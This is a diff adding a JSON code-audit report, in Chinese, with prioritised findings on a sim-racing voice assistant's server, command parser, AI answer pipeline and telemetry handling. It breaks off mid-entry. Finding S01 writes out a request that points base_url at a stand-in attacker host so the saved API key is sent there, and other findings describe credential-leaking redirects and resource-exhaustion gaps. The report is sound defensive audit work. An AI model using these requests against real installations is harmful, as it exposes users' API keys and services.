@@ -1,0 +1,1260 @@
+{
+  "commit": "11cf74c466088bb6b94b54a1d55948b350c6d3e1",
+  "counts": {
+    "P1": 5,
+    "P2": 64,
+    "P3": 30
+  },
+  "total": 99,
+  "findings": [
+    {
+      "id": "S01",
+      "group": "S",
+      "priority": "P1",
+      "title": "无 token 的模型列表 GET 可向指定地址发送已保存密钥",
+      "refs": [
+        "voice-assistant/app/server.py:695-698",
+        "voice-assistant/app/server.py:1057-1063",
+        "voice-assistant/app/server.py:1150-1161"
+      ],
+      "evidence": "Lead独立合成凭据复现",
+      "detail": "已保存 AI Key 后，请求 /api/ai/models?base_url=https://attacker.invalid/v1，Host 合法但不带 Origin/token。真实 Handler 的内存复现返回200，并把保存的合成 Key 作为 Bearer 发向新地址；无需启用AI。不是直接读配置漏洞。恶意 Origin 会被403；网页触发仍取决于浏览器是否允许 loopback/LNA，未宣称所有浏览器均可无条件利用。"
+    },
+    {
+      "id": "S02",
+      "group": "S",
+      "priority": "P1",
+      "title": "跨主机重定向保留模型及TTS认证头",
+      "refs": [
+        "voice-assistant/src/llm_engine.py:85-92",
+        "voice-assistant/src/llm_engine.py:418-424",
+        "voice-assistant/src/tts_engine.py:36-42"
+      ],
+      "evidence": "标准库重定向纯内存复现",
+      "detail": "默认 urlopen 接受跨主机302，HTTPRedirectHandler 生成的新 Request 仍携带 Authorization 或 X-Api-Key。即使初始接口正确，重定向也可改变凭据目的地。没有限制最终 origin 或清除跨域敏感头。未实际联网，未声称当前服务商已发生泄漏。"
+    },
+    {
+      "id": "S03",
+      "group": "S",
+      "priority": "P2",
+      "title": "上游回显密钥会进入错误、问答日志或模型列表成功响应",
+      "refs": [
+        "voice-assistant/src/llm_engine.py:240-258",
+        "voice-assistant/src/llm_engine.py:324-330",
+        "voice-assistant/src/llm_engine.py:551-556",
+        "voice-assistant/src/tts_engine.py:142-148",
+        "voice-assistant/src/tts_engine.py:174-180",
+        "voice-assistant/src/ai_pipeline.py:392-399"
+      ],
+      "evidence": "HTTP错误及成功响应mock复现",
+      "detail": "合成服务错误体 echo SENTINEL-KEY 被原样拼入 LLM/TTS 异常、reason/checks/日志；TTS测试也回显。models 仅对错误分支脱敏，成功 model id 若回显Key也原样返回。会使用户分享诊断时带出凭据；不是声称上游原本不知道Key，也没有发现真实Key外泄。"
+    },
+    {
+      "id": "S04",
+      "group": "S",
+      "priority": "P2",
+      "title": "本地HTTP无读取超时及连接线程上限",
+      "refs": [
+        "voice-assistant/app/server.py:988-994",
+        "voice-assistant/app/server.py:1164-1166"
+      ],
+      "evidence": "静态确定的资源边界缺口",
+      "detail": "ThreadingHTTPServer 每连接启动线程，Handler.timeout未设置，读取请求行/头/body可长期等待；64KiB体积限制不限制等待时间。可达loopback的本机进程可用少量持续连接累积线程；读请求头阶段在鉴权之前。未运行连接洪泛或内存压力攻击。"
+    },
+    {
+      "id": "S05",
+      "group": "S",
+      "priority": "P2",
+      "title": "日志导出作为无token GET产生不受限写盘与压缩",
+      "refs": [
+        "voice-assistant/app/server.py:779-804",
+        "voice-assistant/app/server.py:1074-1075"
+      ],
+      "evidence": "无token入口mock＋静态副作用",
+      "detail": "GET会创建导出目录、环境文件并压缩整个日志目录，无频率、并发、规模或留存限制；反复请求可消耗CPU/磁盘。网页触发需同S01的loopback浏览器条件，不代表能异源读ZIP。同秒并发还共用ZIP/临时说明文件名，存在覆盖和互相删除竞争；归档损坏未实盘并发复现。"
+    },
+    {
+      "id": "S06",
+      "group": "S",
+      "priority": "P3",
+      "title": "本地界面未限制被外部页面嵌入",
+      "refs": [
+        "voice-assistant/app/server.py:1020-1024"
+      ],
+      "evidence": "静态／条件安全风险",
+      "detail": "HTML没有 CSP frame-ancestors 或 X-Frame-Options，前端也无对应拒绝嵌入逻辑。若浏览器允许loopback iframe且用户被诱导点击，可操作iframe内正常带token的真实设置页。依赖用户交互和浏览器策略；没有证明异源读取token、没有做真实点击劫持。"
+    },
+    {
+      "id": "S07",
+      "group": "S",
+      "priority": "P2",
+      "title": "非法TTS超时先落盘再校验，可能让下次启动失败",
+      "refs": [
+        "voice-assistant/src/config.py:447-478",
+        "voice-assistant/app/server.py:901-902",
+        "voice-assistant/app/server.py:934-947"
+      ],
+      "evidence": "Lead在仓库外临时配置独立复现",
+      "detail": "tts.timeout_s=NaN通过validate；配置接口写入.nan并替换正式覆盖层后，load才拒绝，接口报错但坏值已持久化，再启动仍ValueError。Python JSON接受NaN；手写YAML同样触发。字符串/null/负超时亦缺校验，可能使TTS或整个AI构造失败。需要合法API token或用户自己改配置，不是无凭据破坏。"
+    },
+    {
+      "id": "S08",
+      "group": "S",
+      "priority": "P2",
+      "title": "执行类布尔字段把字符串false当成True",
+      "refs": [
+        "voice-assistant/app/server.py:1099",
+        "voice-assistant/app/server.py:1102-1105",
+        "voice-assistant/app/server.py:1124-1125"
+      ],
+      "evidence": "真实Handler纯内存复现",
+      "detail": "play:\"false\"进入执行而非预览；running:\"false\"启动而非关闭监听；layout enabled同类。若已启用改车，错误客户端的预览请求可进入真实操作链。标准UI发送的是真布尔值，攻击仍需合法token。根因为bool()真值转换而非JSON布尔类型验证。"
+    },
+    {
+      "id": "S09",
+      "group": "S",
+      "priority": "P3",
+      "title": "移除环境密钥后，同进程其他配置仍继承旧密钥",
+      "refs": [
+        "voice-assistant/src/config.py:230-239",
+        "voice-assistant/src/config.py:258",
+        "voice-assistant/src/config.py:276-280"
+      ],
+      "evidence": "纯内存双配置加载复现",
+      "detail": "缺整个ai段时_merge浅复制共享DEFAULTS.ai；首次环境Key加载原地污染默认对象，清除环境变量后第二次load仍得到旧Key。可造成跨配置身份/凭据复用；完整自带ai段通常不触发，进程重启可清除。"
+    },
+    {
+      "id": "S10",
+      "group": "S",
+      "priority": "P3",
+      "title": "非ASCII token使认证异常逃出HTTP错误处理",
+      "refs": [
+        "voice-assistant/app/server.py:1083-1087",
+        "voice-assistant/app/server.py:1158"
+      ],
+      "evidence": "纯内存复现TypeError",
+      "detail": "合法Host下，X-Assistant-Token含é等Latin-1字符，compare_digest(str,str)抛TypeError。认证位于do_POST的try之外，结果为连接中断/traceback而非稳定403 JSON；不是认证绕过。"
+    },
+    {
+      "id": "S11",
+      "group": "S",
+      "priority": "P3",
+      "title": "超大JSON整数令配置校验返回500而非400",
+      "refs": [
+        "voice-assistant/src/config.py:320-323",
+        "voice-assistant/src/config.py:431-434",
+        "voice-assistant/app/server.py:1145-1148"
+      ],
+      "evidence": "纯内存复现OverflowError",
+      "detail": "例如playback.volume输入10**400；math.isfinite在检查范围之前将任意精度int转double而溢出。应属于明确拒绝的非法配置，却变内部错误。尚未写盘，不会单独造成持久配置损坏。"
+    },
+    {
+      "id": "S12",
+      "group": "S",
+      "priority": "P3",
+      "title": "源码服务使用--port 0时打印并打开错误地址",
+      "refs": [
+        "voice-assistant/app/server.py:1197-1202"
+      ],
+      "evidence": "静态确定",
+      "detail": "系统实际分配了随机监听端口，界面URL仍由args.port构造为http://127.0.0.1:0，自动打开不可访问地址。桌面入口使用实际server_port，不受这条影响。"
+    },
+    {
+      "id": "A01",
+      "group": "A",
+      "priority": "P1",
+      "title": "否定、转述会被当作改车命令，甚至改另一条胎",
+      "refs": [
+        "voice-assistant/src/command_match.py:47-53",
+        "voice-assistant/src/command_match.py:202-250",
+        "voice-assistant/src/command_match.py:324-337",
+        "voice-assistant/src/engine.py:561-606"
+      ],
+      "evidence": "Lead独立真实parser复现＋执行链静态核对",
+      "detail": "先不换左前胎→换RF；我没说换胎→换LF/RF/LR/RR；上一圈加了10升油→加10L。否定正则不覆盖不换+角位，排除LF后又把前胎识别为前轴，剩下RF。一般动作还缺否认/已完成叙述边界。改车启用并连接游戏时这些结果可进入car.apply；本次未真实广播。"
+    },
+    {
+      "id": "A02",
+      "group": "A",
+      "priority": "P1",
+      "title": "负数、指数和范围被截成另一个合法加油量",
+      "refs": [
+        "voice-assistant/src/command_match.py:159-198",
+        "voice-assistant/src/command_match.py:348-364",
+        "voice-assistant/src/car_control.py:205-212"
+      ],
+      "evidence": "Lead独立真实parser复现",
+      "detail": "加负十升油→10L；加油1e2升→2L；加10到20升油→20L。正则从复杂数值中截取片段，中文分支忽略负字，下游仅验证已被误取的正数，全部能通过整数及范围护栏。应拒绝原始歧义，现会发送错误的合法升数。"
+    },
+    {
+      "id": "A03",
+      "group": "A",
+      "priority": "P2",
+      "title": "侧轴与单角组合换胎只保留单角",
+      "refs": [
+        "voice-assistant/src/command_match.py:220-250"
+      ],
+      "evidence": "纯函数复现",
+      "detail": "换前轮和左后胎仅解析LR；找到单角后提前返回，不再解析前轮/左右侧。执行器清除原勾选再只勾LR，漏掉用户要求的LF/RF仍可能报成功。至少应完整识别组合或明确拒绝。"
+    },
+    {
+      "id": "A04",
+      "group": "A",
+      "priority": "P2",
+      "title": "多操作语句被部分执行，而不是按约束整体拒绝",
+      "refs": [
+        "voice-assistant/src/command_match.py:291-316",
+        "voice-assistant/src/command_match.py:324-347",
+        "voice-assistant/src/command_match.py:377-388"
+      ],
+      "evidence": "纯函数复现",
+      "detail": "取消换胎并加油10升只返回clear_tires；换胎不要加油只返回clear_fuel；换左前加满只换LF。取消分支在多指令检查前返回，families还漏加满及省略胎字的换角位。用户无法获知半句已被静默丢弃。"
+    },
+    {
+      "id": "A05",
+      "group": "A",
+      "priority": "P2",
+      "title": "动态回答缺模板时降成静态知识，后续播旧遥测",
+      "refs": [
+        "voice-assistant/src/ai_pipeline.py:317-321",
+        "voice-assistant/src/ai_learn.py:264-279",
+        "voice-assistant/src/ai_pipeline.py:329-339"
+      ],
+      "evidence": "Lead独立完整学习链复现",
+      "detail": "模型声明dynamic=true但template=null；管线把dynamic改False，复盘后作为knowledge入库。油续航由6.2变1.1圈，再问同句仍ok/source=learn并答6.2圈。丢掉了这不是静态知识的声明，绕过LearnStore对动态无模板拒绝入库的保护。"
+    },
+    {
+      "id": "A06",
+      "group": "A",
+      "priority": "P2",
+      "title": "学习相似匹配不区分前后车等关键对象",
+      "refs": [
+        "voice-assistant/src/ai_learn.py:285-301",
+        "voice-assistant/src/ai_pipeline.py:329-339"
+      ],
+      "evidence": "内存学习库复现",
+      "detail": "前车上一圈圈速多少的答案会命中后车上一圈圈速多少。只用字符相似度≥0.82，没有目标、轮位、否定或意图约束，管线命中即采用。短语库本身的安全归一不能保护独立的学习匹配器。"
+    },
+    {
+      "id": "A07",
+      "group": "A",
+      "priority": "P2",
+      "title": "未展示的模板未来分支可绕过全部回答闸门",
+      "refs": [
+        "voice-assistant/src/ai_pipeline.py:311-339",
+        "voice-assistant/src/ai_learn.py:74-126",
+        "voice-assistant/src/ai_learn.py:268-275"
+      ],
+      "evidence": "Lead独立学习模板复现",
+      "detail": "当前answer正确并经复盘确认，但模板另一个分支包含加油99升并调软尾翼。续航变低后该分支直接ok/source=learn返回，checks只有年龄，没有长度/数据/数字检查。模板只校验结构，复盘确认当前可见回答等于信任全部未来分支。这里是错误文字/语音建议，不是模板直接广播改车。"
+    },
+    {
+      "id": "A08",
+      "group": "A",
+      "priority": "P2",
+      "title": "模板决策输入缺失时落到兜底确定性结论",
+      "refs": [
+        "voice-assistant/src/ai_learn.py:145-152",
+        "voice-assistant/src/ai_learn.py:172-190"
+      ],
+      "evidence": "纯函数复现",
+      "detail": "模板比较laps_of_fuel与laps_remain；两字段都没有，条件按False处理，true分支仍说油不够跑完。只检查被选say的占位符，不检查决策依赖是否齐全。无数据被错误等同为条件不成立，而非拒答。"
+    },
+    {
+      "id": "A09",
+      "group": "A",
+      "priority": "P2",
+      "title": "复盘错误反馈使用错误ID，自动禁用形同虚设",
+      "refs": [
+        "voice-assistant/src/engine.py:820-827",
+        "voice-assistant/app/server.py:756-770",
+        "voice-assistant/src/ai_learn.py:241-244",
+        "voice-assistant/src/ai_learn.py:303-321"
+      ],
+      "evidence": "完整内存复盘链复现",
+      "detail": "history的review_id与入库生成uuid不同；bad分支拿review_id调用mark且忽略False。一次确认入库后两次标错，API均ok，库中err仍0、disabled仍False。用户无法通过纠错反馈停用污染条目；学习命中记录也未携带源条目ID。"
+    },
+    {
+      "id": "A10",
+      "group": "A",
+      "priority": "P2",
+      "title": "数字闸只证明数字出现过，多个边界可稳定绕过",
+      "refs": [
+        "voice-assistant/src/answer_checks.py:19-42",
+        "voice-assistant/src/answer_checks.py:113-118",
+        "voice-assistant/src/answer_checks.py:331-403"
+      ],
+      "evidence": "六类真实run_all纯内存复现；合并一个主项",
+      "detail": "同一上下文fuel_level=18.4、laps_of_fuel=6.2、lap_last=83.5：①18.4升可说成18.4圈；②-6.2被当+6.2；③问题问99圈，答案肯定99圈获数字豁免；④正确1分23.5秒让另处无依据的1升也被consumed跳过；⑤油还够两圈中的两不在中文数字表；⑥小数位越多容差反而增大，6.300000000000可匹配6.2。全部三闸通过。缺字段/对象/单位及文本span绑定，不是推测模型会不会犯错。"
+    },
+    {
+      "id": "A11",
+      "group": "A",
+      "priority": "P2",
+      "title": "处罚与范围外问题分类未落实安全禁区，输出也无内容闸",
+      "refs": [
+        "voice-assistant/src/query_class.py:50-55",
+        "voice-assistant/src/query_class.py:109-128",
+        "voice-assistant/src/router.py:68-74",
+        "voice-assistant/src/ai_pipeline.py:132-152",
+        "voice-assistant/src/answer_checks.py:406-424"
+      ],
+      "evidence": "入口分类及出口校验纯内存复现",
+      "detail": "为什么给我黑旗被分类ANALYSIS，whitelist/full均可外送；现在几月或现在是什么时间被当UNKNOWN，在full可外送，与本地范围拒答不一致。请把尾翼调软等纯文字操作建议只要data_used合法也能通过三闸。禁区主要依赖system提示，未形成输出强制边界；未实际让模型回答。"
+    },
+    {
+      "id": "A12",
+      "group": "A",
+      "priority": "P2",
+      "title": "关闭或切换AI后，在途旧回答仍可播放并覆盖Overlay",
+      "refs": [
+        "voice-assistant/src/engine.py:177-194",
+        "voice-assistant/src/engine.py:808-811",
+        "voice-assistant/src/ai_pipeline.py:258-270",
+        "voice-assistant/src/ai_pipeline.py:364-389"
+      ],
+      "evidence": "Event同步纯内存竞态复现",
+      "detail": "旧ask已进入时关闭AI，asst.ai变None；释放旧请求后，旧handle仍ok，fake player收到音频，live被旧回答改为answer。替换对象不撤销旧实例，freshness只核遥测、不核当前配置generation；退出close也没有撤销在途AI。与R01监听线程未接住下一次PTT不同。"
+    },
+    {
+      "id": "A13",
+      "group": "A",
+      "priority": "P2",
+      "title": "3秒/6秒硬截止不是墙钟截止，慢流会长期占用请求槽",
+      "refs": [
+        "voice-assistant/src/llm_engine.py:91-92",
+        "voice-assistant/src/llm_engine.py:228-264",
+        "voice-assistant/src/tts_engine.py:41-42",
+        "voice-assistant/src/ai_pipeline.py:235-238"
+      ],
+      "evidence": "超时封装mock＋IO语义静态核对",
+      "detail": "只给urlopen传socket timeout；响应持续分块、每块间隔低于timeout时，完整read可远超预算。总年龄检查等ask返回后才发生，单飞gate期间一直占用。mock read约62ms，在10ms配置下仍成功，证明封装无独立墙钟中止；未进行真实慢TCP实验。"
+    },
+    {
+      "id": "A14",
+      "group": "A",
+      "priority": "P2",
+      "title": "外部JSON、音频及错误体无大小上限完整读入",
+      "refs": [
+        "voice-assistant/src/llm_engine.py:85-96",
+        "voice-assistant/src/llm_engine.py:243",
+        "voice-assistant/src/llm_engine.py:423-428",
+        "voice-assistant/src/llm_engine.py:487",
+        "voice-assistant/src/tts_engine.py:36-42"
+      ],
+      "evidence": "静态确定",
+      "detail": "所有resp.read()/exc.read()均无上限；[:200]等截断发生在完整读取解码后。TTS仅限制最小512字节，无最大值。异常兼容端点可造成大内存/解码开销；没有发起大响应压测。"
+    },
+    {
+      "id": "A15",
+      "group": "A",
+      "priority": "P2",
+      "title": "模型字段类型异常跳过正常降级和本地兜底",
+      "refs": [
+        "voice-assistant/src/llm_engine.py:250-258",
+        "voice-assistant/src/ai_pipeline.py:290-307",
+        "voice-assistant/src/engine.py:812-838"
+      ],
+      "evidence": "格式异常mock复现",
+      "detail": "content=null/123/[]导致TypeError而非LlmError；answer为数字/list/dict在.strip抛异常。管线仅捕LlmError，engine通用异常提前return，未到all档fallback_plan路径。即使本地已有正确答案，也变AI处理异常而无正常回退。"
+    },
+    {
+      "id": "A16",
+      "group": "A",
+      "priority": "P2",
+      "title": "每分钟请求限额配置没有任何生产门禁",
+      "refs": [
+        "voice-assistant/src/config.py:148",
+        "voice-assistant/src/config.py:429-434",
+        "voice-assistant/src/ai_pipeline.py:164-191",
+        "voice-assistant/src/ai_pipeline.py:273-291"
+      ],
+      "evidence": "rate=1仍连续3次mock请求复现",
+      "detail": "rate_limit_per_min只被定义、保存和校验，没有时间窗/计数器。设置1后短时3次handle均调用模型且成功。单飞只约束并发，不限制每分钟频率，付费额度保护无效。"
+    },
+    {
+      "id": "A17",
+      "group": "A",
+      "priority": "P2",
+      "title": "--config隔离配置却共享运行目录的学习库",
+      "refs": [
+        "voice-assistant/src/config.py:248-288",
+        "voice-assistant/src/engine.py:116-122",
+        "voice-assistant/src/ai_learn.py:208-212"
+      ],
+      "evidence": "双profile内存复现＋Lead测试写保护实证",
+      "detail": "两个不同绝对配置路径的_root不同，_ai_learn_dir却都指运行目录ai_learn。可相互污染或清空学习数据，测试也会尝试触碰正常学习目录。本轮后端保护层拦截了4次项目内mkdir，错误被_build_ai吞掉，测试仍绿。"
+    },
+    {
+      "id": "A18",
+      "group": "A",
+      "priority": "P3",
+      "title": "1500-token输入预算只裁上下文，不含问题和系统提示",
+      "refs": [
+        "voice-assistant/src/ai_pipeline.py:287-291",
+        "voice-assistant/src/llm_engine.py:173-208",
+        "voice-assistant/src/ai_constants.py:26-28"
+      ],
+      "evidence": "payload纯内存复现",
+      "detail": "内部_payload接口把12000字符问题原样拼成长度12014的user content，没有预算检查；HTTP入口另有512字符上限，不能据此声称可通过HTTP直接提交12000字符。即便有该入口限制，ctx预算仍未包含question和system，完整请求上限没有被落实。未用特定tokenizer精确计token，也未真实付费调用。"
+    },
+    {
+      "id": "A19",
+      "group": "A",
+      "priority": "P3",
+      "title": "模板白名单允许的口语字符串及数组字段填值器处理不了",
+      "refs": [
+        "voice-assistant/src/ai_learn.py:55-71",
+        "voice-assistant/src/ai_learn.py:93-95",
+        "voice-assistant/src/ai_learn.py:172-189"
+      ],
+      "evidence": "纯函数复现",
+      "detail": "lap_last_spoken有值且模板合法，fill_template仍None；segments.best_loss数组里的delta_s同样无法提取。flatten只留数字，dict分支不递归list值，格式器也无字符串通路。模板看似成功入库却每次退回模型，圈速/分段学习失效并增加调用。"
+    },
+    {
+      "id": "T01",
+      "group": "T",
+      "priority": "P2",
+      "title": "SDK燃油质量流量被当作体积流量播报和比较",
+      "refs": [
+        "voice-assistant/src/telemetry.py:623-624",
+        "voice-assistant/src/telemetry_answers.py:327-338"
+      ],
+      "evidence": "纯内存路由复现＋历史原始SDK元数据",
+      "detail": "FuelUsePerHour在现场SDK字段归档中单位明确为kg/h，却原样播成L/h；还乘圈时长后直接与L/圈相减。例如60kg/h、120秒、平均2L/圈，当前实现宣称即时2L/圈、差0。缺燃料密度或单位适配，不能进行该体积比较。历史字段归档作为补充证据见报告方法部分。"
+    },
+    {
+      "id": "T02",
+      "group": "T",
+      "priority": "P2",
+      "title": "多组别的组别第一可能选到另一组车",
+      "refs": [
+        "voice-assistant/src/telemetry_answers.py:293-296"
+      ],
+      "evidence": "Lead独立快照路由复现",
+      "detail": "class=[10,20,20]、class_position=[1,1,2]、玩家idx2时，取第一个组别名次1的idx0，没有按玩家组别过滤。复现播20秒，正确同组idx1应10秒。不是估计间隔精度问题，是对象选择错误。"
+    },
+    {
+      "id": "T03",
+      "group": "T",
+      "priority": "P2",
+      "title": "结果页零基ClassPosition直接回填一基数组",
+      "refs": [
+        "voice-assistant/src/telemetry.py:774-777"
+      ],
+      "evidence": "Lead独立复现＋历史同场SDK采样交叉",
+      "detail": "结果页ClassPosition=[0,1]应转为数组[1,2]，当前得到[0,1]；首名被>0过滤，第二名冒充第一。现有单测反而造了错误的一基ClassPosition，未拦住这项口径差异。"
+    },
+    {
+      "id": "T04",
+      "group": "T",
+      "priority": "P3",
+      "title": "部分结果列表把正确参赛车数缩小",
+      "refs": [
+        "voice-assistant/src/telemetry.py:794-800"
+      ],
+      "evidence": "Lead独立复现",
+      "detail": "已有car_positions=[1,2,3]且field_size=3，ResultsPositions暂只一条，补缺后positions不变而field_size变1。可显示第2/共1辆等矛盾。局部结果列表不应无条件当完整参赛集合。"
+    },
+    {
+      "id": "T05",
+      "group": "T",
+      "priority": "P2",
+      "title": "中途进出维修区的圈记录仍标记非进站圈",
+      "refs": [
+        "voice-assistant/src/telemetry.py:287-290",
+        "voice-assistant/src/telemetry.py:330",
+        "voice-assistant/src/telemetry.py:385",
+        "voice-assistant/src/race_context.py:156-166"
+      ],
+      "evidence": "Lead独立三帧复现",
+      "detail": "开圈非pit→中途pit→跨线非pit，上一圈in_pit仍False，因为标记只在开圈初始化。AI圈史及均值/趋势可能把pit耗时看成节奏变化。本轮明确核实fuel_used=None、燃油样本已排除，不能把它误报为污染油耗。"
+    },
+    {
+      "id": "T06",
+      "group": "T",
+      "priority": "P2",
+      "title": "AI剩余时间未过滤无限哨兵或负值",
+      "refs": [
+        "voice-assistant/src/race_context.py:103",
+        "voice-assistant/src/race_context.py:131-133",
+        "voice-assistant/src/telemetry_answers.py:15-29"
+      ],
+      "evidence": "Lead独立边界复现",
+      "detail": "604800无限哨兵被交给AI并生成为10080分0秒，而本地路由已有上限拒答；-1在任何问题的上下文构造中抛ValueError，还会跳过all档正常fallback。负值真实出现频率未实机核实。0秒已测安全，不算缺陷。本项合并两个同根因领域验证缺口。"
+    },
+    {
+      "id": "T07",
+      "group": "T",
+      "priority": "P2",
+      "title": "跨线官方圈速晚到时，圈史永久保存上一圈旧成绩",
+      "refs": [
+        "voice-assistant/src/telemetry.py:298-310",
+        "voice-assistant/src/telemetry.py:369-375",
+        "voice-assistant/src/segments.py:256-292"
+      ],
+      "evidence": "正常采样模型＋一帧延迟纯内存复现",
+      "detail": "跨第二圈线时LapLast仍为旧80秒，随后更新真实90秒。SegmentModel能延迟结算为90秒和四段22.5秒，但DerivedTracker已固化lap2=80秒、sectors=[]，从不回填。同一圈两处来源矛盾，影响AI均值、趋势和分段历史。"
+    },
+    {
+      "id": "T08",
+      "group": "T",
+      "priority": "P2",
+      "title": "新SessionNum未匹配时使用上一session成绩",
+      "refs": [
+        "voice-assistant/src/telemetry.py:725-729",
+        "voice-assistant/src/telemetry.py:674-678"
+      ],
+      "evidence": "Lead独立模拟session切换复现",
+      "detail": "当前SessionNum=1，但Sessions仅旧0；fallback到最后一行，给当前快照填旧名次和80秒最快圈，赛道胶量亦有相同模式。会话切换YAML晚更新即可形成该窗口；应保持未知而不是借上一场数据。真实发生率未实机测。"
+    },
+    {
+      "id": "T09",
+      "group": "T",
+      "priority": "P3",
+      "title": "相差两秒的近邻跨线阶段被误当套圈，暂时拒绝分段对比",
+      "refs": [
+        "voice-assistant/src/segments.py:657-665"
+      ],
+      "evidence": "相位错开的正常时间轴复现",
+      "detail": "同组前车提前2秒越线，两车已完成圈数暂为[2,3]且都已有有效分段。target_for(ahead)返回None，玩家跨线后立即恢复。仅按已完成圈数相等判断套圈，没有结合圈内位置，会在每圈近邻跨线窗口丢失可比对象。"
+    },
+    {
+      "id": "T10",
+      "group": "T",
+      "priority": "P3",
+      "title": "全量分段拒答规则误伤指定单段和摘要差值",
+      "refs": [
+        "voice-assistant/src/segment_rules.py:14-33",
+        "voice-assistant/src/telemetry_answers.py:234-237"
+      ],
+      "evidence": "纯函数及路由复现",
+      "detail": "第二段分段用时是多少、前车上一圈分段差多少都被is_full_split判True并硬拒答。分段用时、上一圈分段裸子串优先于指定段/比较修饰，超出了仅禁止全部分段播报的边界。"
+    },
+    {
+      "id": "R01",
+      "group": "R",
+      "priority": "P2",
+      "title": "AI等待同步占住PTT线程，下一次按松键完全丢失",
+      "refs": [
+        "voice-assistant/src/listener.py:278-290",
+        "voice-assistant/src/listener.py:323-337",
+        "voice-assistant/app/server.py:225-237",
+        "voice-assistant/src/engine.py:779-806"
+      ],
+      "evidence": "Event阻塞回调纯内存复现",
+      "detail": "listener同线程_process并同步跑Service的AI回调，busy=False并不能恢复轮询。复现中busy始终False，回调阻塞期间第二次完整按松没有一次新键状态轮询，最终只收到第一次问题。宣称等待模型时不聋的正常麦克风路径不成立。"
+    },
+    {
+      "id": "R02",
+      "group": "R",
+      "priority": "P2",
+      "title": "加满计算小数升数后被自己的整数SDK护栏拒绝",
+      "refs": [
+        "voice-assistant/src/engine.py:523-540",
+        "voice-assistant/src/engine.py:591-606",
+        "voice-assistant/src/car_control.py:205-212"
+      ],
+      "evidence": "真实计算＋FakeSDK复现",
+      "detail": "当前20.3L、油量比例0.5时，加满算出需20.3L，后续整数升护栏拒绝，sent=[]。常见连续燃油状态下加满功能不工作。SDK整数约束本身不是缺陷；产品需选择明确量化/确认策略，不能静默猜升数。"
+    },
+    {
+      "id": "R03",
+      "group": "R",
+      "priority": "P2",
+      "title": "本地拒答和固定操作反馈保留上一条Overlay答案",
+      "refs": [
+        "voice-assistant/src/engine.py:388-390",
+        "voice-assistant/src/engine.py:466-478",
+        "voice-assistant/src/engine.py:653-690",
+        "voice-assistant/src/engine.py:1150-1163"
+      ],
+      "evidence": "真实ask路径＋mock播放器复现",
+      "detail": "新问题heard已更新，未命中后ok=False，但state仍answer、answer仍previous fuel 20L；_say固定反馈不更新live。可能出现新问题配旧遥测数字，或旧thinking一直不消失。正常play_plan和AI更新不能覆盖这些分支。"
+    },
+    {
+      "id": "R04",
+      "group": "R",
+      "priority": "P2",
+      "title": "保存AI分析键未更新正在运行的监听器",
+      "refs": [
+        "voice-assistant/app/server.py:930-960",
+        "voice-assistant/src/listener.py:171-177",
+        "voice-assistant/src/listener.py:201-204"
+      ],
+      "evidence": "Service热保存纯内存复现",
+      "detail": "首次绑定、改绑或解除ai.analysis_key时，保存ok且cfg已变，listener.analysis_vk仍旧、重启次数0。restart只检查ptt/asr段；analysis_vk仅构造时快照。需要手动停开监听才生效，UI却无此提示。"
+    },
+    {
+      "id": "R05",
+      "group": "R",
+      "priority": "P2",
+      "title": "SDL方向盘后端已死仍报告监听成功，停开无法恢复",
+      "refs": [
+        "voice-assistant/src/wheel.py:99-118",
+        "voice-assistant/src/listener.py:179-199",
+        "voice-assistant/app/server.py:239-247"
+      ],
+      "evidence": "死亡后端及监听启动mock复现",
+      "detail": "已有wheel binding时SDL初始化/poll线程失败，后端只记error却未set_stop；单例不重建，Service仍running=True/listener.error=None且不轮询键盘。普通热拔插不一定触发，本项针对后端错误退出；需正确报失败并重试，不应擅自切键盘。"
+    },
+    {
+      "id": "R06",
+      "group": "R",
+      "priority": "P2",
+      "title": "PortAudio缺失时winsound降级被顶层导入阻断",
+      "refs": [
+        "voice-assistant/src/player.py:67-77",
+        "voice-assistant/src/listener.py:19-20",
+        "voice-assistant/src/engine.py:86",
+        "voice-assistant/app/server.py:48-49"
+      ],
+      "evidence": "合成ImportError/OSError复现",
+      "detail": "Player可成功选winsound，但应用无条件import listener，后者强import sounddevice；连--no-listen或文字模式也在启动前失败。未卸载实际依赖，本机并未发生DLL丢失；是降级路径不闭合。"
+    },
+    {
+      "id": "R07",
+      "group": "R",
+      "priority": "P2",
+      "title": "旧CLI语音入口不接AI后续，all档可无声结束",
+      "refs": [
+        "voice-assistant/src/voice_app.py:95-118",
+        "voice-assistant/src/engine.py:443-453",
+        "voice-assistant/src/engine.py:503-512"
+      ],
+      "evidence": "静态完整入口闭环＋入口mock",
+      "detail": "voice_app及--wav只调用asst.ask并丢弃ai_eligible/ai_disambiguate返回，不像桌面Service再接ask_ai/judge；all档让出本地答案后没有后续AI回答，分析键也未传入CLI listener。未真实调用模型；正常桌面AI入口不由这条判定为失效。"
+    },
+    {
+      "id": "R08",
+      "group": "R",
+      "priority": "P2",
+      "title": "关闭改车控制器不是严格发送边界",
+      "refs": [
+        "voice-assistant/src/car_control.py:120-151",
+        "voice-assistant/src/engine.py:1127-1131",
+        "voice-assistant/app/server.py:303-306"
+      ],
+      "evidence": "Event精确同步FakeSDK竞态复现",
+      "detail": "退出close可插在available检查与pit_command发送之间；复现中_closed=True后FakeSDK仍收到一条命令。available检查持锁，实际发送不持同一锁。普通设置热重载另有operation_lock，不能泛称所有关闭都必现；真实SDK是否受理未测。"
+    },
+    {
+      "id": "R09",
+      "group": "R",
+      "priority": "P3",
+      "title": "界面录音测试继承上次分析键来源",
+      "refs": [
+        "voice-assistant/src/listener.py:249-264",
+        "voice-assistant/src/listener.py:284-290",
+        "voice-assistant/src/listener.py:323"
+      ],
+      "evidence": "假音频与双回调复现",
+      "detail": "先使用分析键后，record_for不初始化pending_source，测试录音送on_analysis_result而非普通PTT回调。可能绕过本地规则额外请求AI，测试语义取决于上次用了什么键；本次没有实际录音/调用。"
+    },
+    {
+      "id": "R10",
+      "group": "R",
+      "priority": "P3",
+      "title": "监听重启只忽略已按住PTT，不忽略已按住分析键",
+      "refs": [
+        "voice-assistant/src/listener.py:298-309"
+      ],
+      "evidence": "fake键状态复现",
+      "detail": "analysis键在start前已按住，启动立即录音并触发分析，无需一次新的按下。启动释放检查仅_down不含_analysis_down，与旁边防重启误触发意图不一致。未读取或注入真实系统按键。"
+    },
+    {
+      "id": "R11",
+      "group": "R",
+      "priority": "P3",
+      "title": "Windows语音包根相对／驱动器相对路径可越出包目录",
+      "refs": [
+        "voice-assistant/src/voicepack.py:57-63",
+        "voice-assistant/src/voicepack.py:100-101"
+      ],
+      "evidence": "Windows解释器词法复现",
